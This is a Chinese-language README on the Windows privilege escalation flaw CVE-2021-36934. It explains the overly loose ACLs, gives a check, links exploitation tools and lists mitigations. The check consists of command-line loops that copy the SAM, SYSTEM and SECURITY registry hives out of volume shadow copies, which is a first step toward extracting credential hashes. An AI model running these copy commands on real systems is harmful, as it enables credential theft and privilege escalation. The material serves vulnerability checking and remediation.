# Windows 提权漏洞（CVE-2021-36934）

我只是大自然的搬运工，顺便实践检验一下大佬们的东西是否准确。

# 简介

微软在7月20日发布紧急安全公告，公开了一个Windows提权漏洞。由于对多个系统文件（包括安全帐户管理器 (SAM) 数据库）的访问控制列表 (ACL) 过于宽松，攻击者可读取SAM，SYSTEM，SECURITY等文件内容，进而获取用户NTLM Hash值，从而通过解密Hash值或Hash传递等方法造成特权提升漏洞。成功利用此漏洞的攻击者可以使用 SYSTEM 权限运行任意代码。
# 漏洞验证

以管理员权限运行`CVE-2021-36934_Poc.ps1`和`VSSCopy.exe`，如图：

![image](https://github.com/NHPT/CVE-Exploit-Script/blob/master/CVE-2021-36934/Check1.png)
![image](https://github.com/NHPT/CVE-Exploit-Script/blob/master/CVE-2021-36934/Check2.png)

还可以以管理员身份在命令行运行如下命令，可达到同样的效果：
```
for /l %i in (1 1 10) do copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%i\Windows\System32\config\SAM SAM.bak
for /l %i in (1 1 10) do copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%i\Windows\System32\config\SYSTEM SYSTEM.bak
for /l %i in (1 1 10) do copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%i\Windows\System32\config\SECURITY SECURITY.bak
```
如果漏洞存在可以在当前目录下看到SAM.bak等文件。

# 漏洞利用

## 参考工具

https://github.com/GossiTheDog/HiveNightmare

## 完整流程

Freebuf：https://www.freebuf.com/vuls/282071.html

CSDN：https://blog.csdn.net/qq_32261191/article/details/119061742

# 解决方案

1.禁用默认管理员用户：`net user administrator /active:no`
2.限制对 `%windir%\system32\config` 内容的访问（我使用下边的命令设置未生效，使用`Mitigation.ps1`设置成功）:
```
# 命令提示符（以管理员身份运行）
icacls %windir%\system32\config\*.* /inheritance:e

# Windows PowerShell（以管理员身份运行）
icacls $env:windir\system32\config\*.* /inheritance:e
```
3.删除所有系统还原点和删除卷影复制服务（VSS）卷影副本。该方法会影响删除卷影副本可能会影响还原操作，包括使用第三方备份应用程序还原数据的能力。有关如何删除卷影副本的详细信息，请参阅KB5005357- 删除卷影副本。
